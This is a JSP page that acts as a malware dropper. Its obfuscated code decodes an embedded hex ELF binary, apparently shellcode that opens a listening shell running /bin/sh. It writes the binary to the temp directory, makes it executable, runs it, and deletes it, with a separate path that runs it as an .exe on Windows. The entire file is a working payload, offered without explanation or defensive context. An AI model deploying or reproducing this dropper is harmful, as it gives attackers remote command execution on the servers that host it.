<%@ page import="java.io.*" %>
<%
  String lBlqgsSFRXZtGhP = "7f454c460101010000000000000000000200030001000000548004083400000000000000000000003400200001000000000000000100000000000000008004080080040898000000dc000000070000000010000031dbf7e35343536a0289e1b066cd809359b03fcd804979f9680a0a0e0f68020020fb89e1b066505153b30389e1cd8052686e2f7368682f2f626989e3525389e1b00bcd80";
  String ACZWiUxw = System.getProperty("java.io.tmpdir") + "/yfrAUAkxp";

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
    ACZWiUxw = ACZWiUxw.concat(".exe");
  }

  int aZygISubuQ = lBlqgsSFRXZtGhP.length();
  byte[] RePhYysP = new byte[aZygISubuQ/2];
  for (int VYrRoKuXKPunA = 0; VYrRoKuXKPunA < aZygISubuQ; VYrRoKuXKPunA += 2) {
    RePhYysP[VYrRoKuXKPunA / 2] = (byte) ((Character.digit(lBlqgsSFRXZtGhP.charAt(VYrRoKuXKPunA), 16) << 4)
                                              + Character.digit(lBlqgsSFRXZtGhP.charAt(VYrRoKuXKPunA+1), 16));
  }

  FileOutputStream uDiRYlVAK = new FileOutputStream(ACZWiUxw);
  uDiRYlVAK.write(RePhYysP);
  uDiRYlVAK.flush();
  uDiRYlVAK.close();

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
    String[] wNMDATqNTyGoQY = new String[3];
    wNMDATqNTyGoQY[0] = "chmod";
    wNMDATqNTyGoQY[1] = "+x";
    wNMDATqNTyGoQY[2] = ACZWiUxw;
    Process bkXRYtTpluhHXiQ = Runtime.getRuntime().exec(wNMDATqNTyGoQY);
    if (bkXRYtTpluhHXiQ.waitFor() == 0) {
      bkXRYtTpluhHXiQ = Runtime.getRuntime().exec(ACZWiUxw);
    }

    File ycoCHWbCBZ = new File(ACZWiUxw); ycoCHWbCBZ.delete();
  } else {
    String[] WvXArSuwKaHNnwP = new String[1];
    WvXArSuwKaHNnwP[0] = ACZWiUxw;
    Process bkXRYtTpluhHXiQ = Runtime.getRuntime().exec(WvXArSuwKaHNnwP);
  }
%>
